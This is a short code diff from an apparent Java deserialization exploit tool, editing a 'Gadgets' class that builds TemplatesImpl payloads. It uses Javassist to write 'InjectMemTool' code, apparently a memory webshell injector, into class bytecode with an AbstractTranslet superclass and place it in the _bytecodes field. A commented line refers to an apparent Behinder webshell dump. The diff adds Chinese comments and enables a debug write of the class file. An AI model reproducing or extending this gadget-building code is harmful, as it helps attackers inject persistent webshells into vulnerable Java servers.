@@ -91,8 +91,11 @@ public class Gadgets {
 
         // 根据不同payload加载不同的CtClass
         Class<? extends EchoPayload> echoClazz = EchoPayload.Utils.getPayloadClass(payload);
+        
+        // 创建echoPayload的实例
         EchoPayload<?> echoObj = echoClazz.newInstance();
 
+        //使用JavaAssist类将InjectMemTool的代码写入CtClass 并返回
         clazz = echoObj.genPayload(pool);
 
         // 继承abstTranslet父类
@@ -100,13 +103,13 @@ public class Gadgets {
         clazz.setSuperclass(superClass);
 
         // 生成Class字节码写入 _bytecode字段用于之后的defineClass执行
-        byte[] classBytes = clazz.toBytecode();
+               byte[] classBytes = clazz.toBytecode();
 
         // asm
 //        byte[] classBytes = asm.vulgui.deser.plugins.InjectMomBehinderDump.dump();
 
         // 测试写入文件
-//        clazz.writeFile("D:\\tools\\temp\\");
+       clazz.writeFile("D:\\tools\\temp\\");
 
         Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
         bcField.setAccessible(true);
